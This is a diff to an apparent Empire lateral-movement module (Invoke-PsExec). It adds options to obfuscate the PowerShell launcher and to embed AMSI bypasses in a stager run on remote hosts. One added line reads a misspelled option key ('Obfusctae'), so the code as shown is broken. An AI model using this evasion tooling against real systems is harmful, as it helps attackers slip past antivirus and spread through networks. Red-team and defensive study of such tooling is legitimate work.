@@ -2,6 +2,7 @@ from __future__ import print_function
 from builtins import str
 from builtins import object
 from lib.common import helpers
+import threading
 
 class Module(object):
 
@@ -49,6 +50,26 @@ class Module(object):
                 'Required'      :   False,
                 'Value'         :   ''
             },
+            'Obfuscate': {
+                'Description': 'Switch. Obfuscate the launcher powershell code, uses the ObfuscateCommand for obfuscation types. For powershell only.',
+                'Required': False,
+                'Value': 'False'
+            },
+            'ObfuscateCommand': {
+                'Description': 'The Invoke-Obfuscation command to use. Only used if Obfuscate switch is True. For powershell only.',
+                'Required': False,
+                'Value': r'Token\All\1'
+            },
+            'AMSIBypass': {
+                'Description': 'Include mattifestation\'s AMSI Bypass in the stager code.',
+                'Required': False,
+                'Value': 'True'
+            },
+            'AMSIBypass2': {
+                'Description': 'Include Tal Liberman\'s AMSI Bypass in the stager code.',
+                'Required': False,
+                'Value': 'False'
+            },
             'ComputerName' : {
                 'Description'   :   'Host[s] to execute the stager on, comma separated.',
                 'Required'      :   True,
@@ -90,6 +111,9 @@ class Module(object):
         #   like listeners/agent handlers/etc.
         self.mainMenu = mainMenu
 
+        # used to protect self.http and self.mainMenu.conn during threaded listener access
+        self.lock = threading.Lock()
+
         for param in params:
             # parameter format is [Name, Value]
             option, value = param
@@ -98,7 +122,12 @@ class Module(object):
 
 
     def generate(self, obfuscate=False, obfuscationCommand=""):
-        
+
+        # Set booleans to false by default
+        Obfuscate = False
+        AMSIBypass = False
+        AMSIBypass2 = False
+
         listenerName = self.options['Listener']['Value']
         computerName = self.options['ComputerName']['Value']
         serviceName = self.options['ServiceName']['Value']
@@ -107,6 +136,13 @@ class Module(object):
         proxyCreds = self.options['ProxyCreds']['Value']
         command = self.options['Command']['Value']
         resultFile = self.options['ResultFile']['Value']
+        if (self.options['Obfusctae']['Value']).lower() == 'true':
+            Obfuscate =True
+        ObfuscateCommand = self.options['ObfuscateCommand']['Value']
+        if (self.options['AMSIBypass']['Value']).lower() == 'true':
+            AMSIBypass = True
+        if (self.options['AMSIBypass2']['Value']).lower() == 'true':
+            AMSIBypass2 = True
 
         # read in the common module source code
         moduleSource = self.mainMenu.installPath + "/data/module_source/lateral_movement/Invoke-PsExec.ps1"
